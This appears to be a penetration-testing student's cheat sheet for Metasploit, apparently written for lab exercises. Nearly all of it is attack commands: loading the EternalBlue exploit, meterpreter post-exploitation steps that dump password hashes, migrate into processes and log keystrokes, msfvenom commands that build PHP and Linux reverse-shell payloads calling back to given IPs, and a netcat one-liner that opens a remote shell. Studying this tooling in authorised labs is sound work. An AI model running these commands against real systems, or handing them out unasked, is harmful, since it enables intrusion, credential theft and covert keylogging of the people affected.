use [exploit/windows/smb/ms17_010_eternalblue]
show [options|payloads]
set payload N
set PARAM VALUE
unset [all|RHOST]
setg
unsetg
info
back
search [[type:auxiliary] telnet]
exploit
exploit -j -> run in the background
check -> Some modules support the check option. This will check if the target system is vulnerable without exploiting it.

background ou CTL+Z
sessions

db_status
workspace [-h]
workspace -a -> add a workspace
workspace -d -> delete a workspace
db_nmap           Executes nmap and records the output automatically
hosts [-h]            List all hosts in the databa
services [-h]         List all services in the database
vulns [-h]            List all vulnerabilities in the database

use exploit/multi/handler -> set payload THE_RIGHT_PAYLOAD

terminal:
[systemctl start postgresql]
msfdb init

meterpreter:
hashdump
search
load
ps
migrate -> to word, firefox ...
keyscan_start keyscan_dump keyscan_stop -> for capturing keystroke of the process

ex msfvenom:
msfvenom -l payloads | less
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php #Please note: The output PHP file will miss the starting PHP tag commented and the end tag (?>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.124.149 LPORT=1001 -f elf > shell.elf

note:
Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
	shell/reverse_tcp
As staged payloads are denoted with another forward slash (/).
This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
	windows/x64/meterpreter/reverse_tcp
A Linux 32bit stageless Meterpreter payload would look like this:
	linux/x86/meterpreter_reverse_tcp

reverse shell: nc <IP> <PORT> -e /bin/bash
	use (for example) netcat -l <PORT> for listening
